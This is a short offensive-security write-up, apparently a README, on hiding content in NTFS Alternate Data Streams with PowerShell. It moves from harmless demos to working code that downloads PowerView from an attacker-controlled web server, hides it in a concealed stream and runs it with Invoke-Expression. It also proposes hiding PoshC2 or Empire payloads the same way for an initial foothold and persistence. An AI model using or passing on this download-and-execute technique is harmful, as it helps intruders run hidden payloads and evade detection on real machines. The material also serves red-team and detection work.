# Alternate-Data-Streams with PowerShell

I literally stumbled upon this whilst reading up on the parameters for the Get-Content and Set-Content cmdlets for another piece of research.
The paramemeter that got my interest is -Stream which allows the user the ability to read and write NTFS alternate data streams.
If we create a file with the following commands;
```powershell
$file = "$env:TEMP\test.txt"
Set-Content -Path $file -Value 'Alternate Data Stream Test File'
```
To read the file content, we use the following;
```powershell
Get-Content -Path $file
```
Which will return;
```powershell
Alternate Data Stream Test File
```

## Hiding Content
As I mentioned above the -Stream parameter lets the user access the 'Hidden' NTFS Alternate Data Stream.
A simple example using the file created above;
```powershell
Add-Content -Path $file -Value 'Hidden Data' -Stream 'hiddenstream'

Get-Content -Path $file -Stream 'hiddenstream'
```
## Something More Useful
This is great, however not so much use, so what if we could hide something a touch more useful, say PowerView?
Taking the simple Proof of Concept - alternate-data-stream.txt from the repository, we create a new file as above, put some content in the file, however we now download a payload, (PowerView.ps1 in this example), from a webserver we control and hide it in an NFTS Alternate Data Stream, (called powerview).Finally we grab the content from the ADS and execute it.

```powershell
$file = "$env:TEMP\test.txt"
Set-Content -Path $file -Value 'Alternate Data Stream Test File'
Get-Content -Path $file
Alternate Data Stream Test File

$pvfile = Invoke-WebRequest -Uri http://192.168.0.105:8000/powerview.ps1
Add-Content -Encoding Byte -Path $file -Value $pvfile.Content -Stream 'powerview'
Invoke-Expression (Get-Content -Path $file -Stream 'powerview' -Raw)
```

Taking things further I put together a PowerShell script that creates a random filename with a randomish amount of random content and a random ADS name. The script asks the user for the uri of the payload to download and embed into the freshly created file. Also in this example the dowload process is able to detect webproxy settings and use the current users credentials, (Proxy Aware).

## The script should be ran . sourced i.e.
```powershell
. ./Invoke-ADS.ps1
```
Further uses could be to download a payload, say a standard PoshC2 or Empire base64 encoded payload and hide it in a file and use this as the intial foothold and a persistence method.